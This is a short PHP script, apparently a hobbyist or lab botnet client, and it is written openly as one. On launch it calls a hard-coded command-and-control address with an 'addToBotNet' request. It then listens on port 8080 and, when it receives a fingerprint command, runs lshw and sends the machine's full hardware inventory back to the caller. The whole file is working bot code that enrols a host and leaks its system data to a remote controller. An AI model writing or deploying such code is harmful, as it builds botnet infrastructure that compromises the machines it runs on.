<?php
set_time_limit(0);
$CandCIP = '172.16.77.134';
sendOutRequests('addToBotNet');
$command="/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'";
$localIP = exec ($command);
$socket = stream_socket_server("tcp://$localIP".':8080', $errorNumber, $errorString);

if (!$socket) {
  echo "$errorNumber ($errorString)<br />\n";
} else {
  while ($conn = stream_socket_accept($socket)) {
  	$logFile = fOpen('logFile.txt','a');
  	echo $socket;
  	$input = fread($conn, 1024);
  	echo gettype($input);
  	//logFileAppend($input,$logFile);
    handleIncomingTraffic($input,$conn);
  	//print_r($input);
  	
    fwrite($conn, '<html><body>hello</body></html>');
    //fclose($conn);
  }
  fclose($socket);
}
function handleIncomingTraffic($HttpRequest,$connection)
{
  if (strpos($HttpRequest, 'requestFingerPrint')!=0) {
    echo 'Fingerprinting';
    $fingerPringInput = exec ('lshw -html >> system_info.html');
    $outputFingerPrint = file_get_contents('system_info.html');
    fwrite($connection, '>>FingerPrint<<'."\n".$outputFingerPrint);
    //fclose($GLOBALS['socket']);
  } else {
    fwrite($connection, 'Error 404');
  }
  
}
function logFileAppend($stringForLog,$logFileStream)
{
  $dateTime = date('Y-m-d H:i:s');
  $outputString=$stringForLog;

  $output = "\n".$dateTime.'='."\n".$outputString;
  echo $output;
  if(fwrite($logFileStream, $output)==false)
    echo 'error writing';
}
function sendOutRequests($request)
{
  $ch = curl_init();

  // set URL and other appropriate options
  echo 'http://'.$GLOBALS['CandCIP'].':8080/';
  curl_setopt($ch, CURLOPT_URL, 'http://'.$GLOBALS['CandCIP'].':8080/'.$request);
  echo 'sending';
  curl_setopt($ch, CURLOPT_HEADER, 0);
  // grab URL and pass it to the browser
  curl_exec($ch);
}
?>